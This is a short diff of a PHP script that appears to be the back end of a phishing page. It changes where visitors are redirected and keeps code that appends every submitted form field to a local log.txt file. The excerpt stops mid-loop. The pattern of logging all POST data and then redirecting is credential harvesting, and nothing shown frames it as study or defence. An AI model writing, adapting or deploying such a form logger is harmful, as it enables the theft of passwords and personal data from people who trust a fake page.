@@ -1,5 +1,5 @@
 <?php
-header ('Location: http://www.google.com');
+header ('Location: https://swatlivefm.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
